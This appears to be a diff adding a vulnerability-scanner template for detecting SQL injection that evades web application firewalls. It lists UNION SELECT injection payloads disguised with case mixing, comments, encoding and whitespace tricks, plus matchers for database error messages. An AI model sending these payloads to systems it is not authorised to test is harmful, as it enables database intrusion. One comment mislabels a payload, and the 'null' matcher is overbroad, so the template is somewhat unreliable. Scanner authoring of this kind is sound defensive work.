@@ -1,0 +1,57 @@
+id: sqli-waf-bypass
+
+info:
+  name: SQL Injection WAF Bypass Techniques
+  author: security-researcher
+  severity: high
+  description: |
+    WAF(웹 방화벽) 우회 기법을 이용한 SQL 인젝션 취약점을 탐지합니다.
+    대소문자 변환, URL 인코딩, 주석 삽입, 공백 우회 등의 기법을 사용합니다.
+  tags: sqli,waf-bypass,evasion,injection
+
+http:
+  - method: GET
+    path:
+      # 대소문자 혼용
+      - "{{BaseURL}}?id=1 uNiOn SeLeCt NULL--"
+      # 인라인 주석
+      - "{{BaseURL}}?id=1 /*!UNION*/ /*!SELECT*/ NULL--"
+      # URL 이중 인코딩
+      - "{{BaseURL}}?id=1%2527"
+      # 공백 대체 (+, //, %09, %0a, %0d)
+      - "{{BaseURL}}?id=1%09UNION%09SELECT%09NULL--"
+      - "{{BaseURL}}?id=1%0aUNION%0aSELECT%0aNULL--"
+      - "{{BaseURL}}?id=1/**/UNION/**/SELECT/**/NULL--"
+      # 버퍼 오버플로우 스타일 우회
+      - "{{BaseURL}}?id=1 AND 1=1 UNION SELECT NULL--"
+      # 16진수 인코딩
+      - "{{BaseURL}}?id=1 AND 1=0x31--"
+      # 과학적 표기법
+      - "{{BaseURL}}?id=1e0 UNION SELECT NULL--"
+      # 주석으로 키워드 분리
+      - "{{BaseURL}}?id=1 UN/**/ION SE/**/LECT NULL--"
+      # 백틱 우회 (MySQL)
+      - "{{BaseURL}}?id=1` UNION SELECT NULL--"
+      # 괄호 우회
+      - "{{BaseURL}}?id=(1) UNION (SELECT NULL)--"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "you have an error in your sql syntax"
+          - "warning: mysql"
+          - "ORA-\\d{5}"
+          - "Microsoft OLE DB"
+          - "PostgreSQL.*ERROR"
+          - "sql.*error|syntax.*error"
+        condition: or
+        case-insensitive: true
+
+      - type: word
+        part: body
+        words:
+          - "sqli-test"
+          - "null"
+        case-insensitive: true
